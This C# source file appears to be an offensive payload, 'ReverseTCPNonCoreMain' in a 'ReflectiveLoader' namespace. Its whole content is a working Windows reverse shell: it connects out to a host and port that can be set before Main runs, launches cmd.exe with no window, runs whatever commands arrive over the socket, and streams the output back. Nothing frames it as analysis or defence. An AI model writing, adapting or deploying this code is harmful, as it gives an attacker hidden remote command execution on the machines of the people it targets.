using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

namespace ReflectiveLoader
{
    class ReverseTCPNonCoreMain
    {
        static StreamWriter streamWriter;
        static String _host = "127.0.0.1";
        static int _port = 443;

        /* initializes the address and port with values
         * different from the default values,
         * as name states must be called before main */
        private static void preMainInit(String host, int port)
        {
            Console.WriteLine("====== preMainInit");
            _host = host;
            _port = port;
        }

        public static void Main()
        {
            try
            {
                TcpClient client = new TcpClient(_host, _port);
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);
                streamWriter.AutoFlush = true;

                Process cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.RedirectStandardError = true;
                cmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                cmd.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                cmd.Start();

                streamWriter.WriteLine($"Reverse shell connected to {_host}:{_port}");

                cmd.BeginOutputReadLine();
                cmd.BeginErrorReadLine();

                while (true)
                {
                    string command = streamReader.ReadLine();
                    cmd.StandardInput.WriteLine(command);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                }
                catch (Exception ex)
                {
                    streamWriter.WriteLine("Error:" + ex.Message);
                }
            }
        }
    }
}